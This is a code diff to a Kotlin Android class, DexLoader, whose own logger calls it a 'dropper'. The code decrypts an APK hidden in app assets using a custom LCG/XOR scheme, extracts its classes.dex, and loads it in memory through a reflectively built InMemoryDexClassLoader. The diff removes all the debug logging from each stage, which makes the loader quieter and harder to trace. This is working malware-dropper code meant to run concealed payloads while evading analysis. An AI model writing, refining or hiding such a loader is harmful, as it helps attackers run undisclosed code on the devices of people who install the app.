@@ -52,10 +52,8 @@ object DexLoader {
         // ── Step 1: Read encrypted blob from assets ───────────────────────────
         val encryptedBlob = try {
             val bytes = context.assets.open(assetName).use { it.readBytes() }
-            DebugLogger.logDropper("Asset read", DebugLogger.Status.SUCCESS, "$assetName — ${bytes.size} bytes")
             bytes
         } catch (e: Exception) {
-            DebugLogger.logDropper("Asset read", DebugLogger.Status.FAILED, "$assetName — ${e::class.simpleName}: ${e.message}")
             throw e
         }
 
@@ -64,17 +62,14 @@ object DexLoader {
                    ((encryptedBlob[1].toLong() and 0xFF) shl 8) or
                    ((encryptedBlob[2].toLong() and 0xFF) shl 16) or
                    ((encryptedBlob[3].toLong() and 0xFF) shl 24)) and MASK
-        DebugLogger.logDropper("Seed extract", DebugLogger.Status.SUCCESS, "0x${seed.toString(16).uppercase()}")
 
         val ciphertext = encryptedBlob.copyOfRange(4, encryptedBlob.size)
 
         // ── Step 3: Decrypt LCG+nibble+XOR ───────────────────────────────────
         val apkBytes = try {
             val decrypted = lcgDecrypt(ciphertext, seed)
-            DebugLogger.logDropper("Decrypt", DebugLogger.Status.SUCCESS, "${decrypted.size} bytes")
             decrypted
         } catch (e: Exception) {
-            DebugLogger.logDropper("Decrypt", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
             throw e
         }
 
@@ -85,10 +80,8 @@ object DexLoader {
         // ── Step 4: Extract classes.dex from decrypted APK via ZipInputStream ─
         val dexBytes = try {
             val dex = extractDex(apkBytes)
-            DebugLogger.logDropper("ZIP extract classes.dex", DebugLogger.Status.SUCCESS, "${dex.size} bytes")
             dex
         } catch (e: Exception) {
-            DebugLogger.logDropper("ZIP extract classes.dex", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
             throw e
         }
 
@@ -129,10 +122,8 @@ object DexLoader {
             val cl = ClassLoader::class.java.cast(
                 imdclCtor.newInstance(buf, context.classLoader)
             ) ?: throw IllegalStateException("ClassLoader cast failed")
-            DebugLogger.logDropper("ClassLoader load", DebugLogger.Status.SUCCESS, "InMemoryDexClassLoader ready")
             cl
         } catch (e: Exception) {
-            DebugLogger.logDropper("ClassLoader load", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
             throw e
         }
 
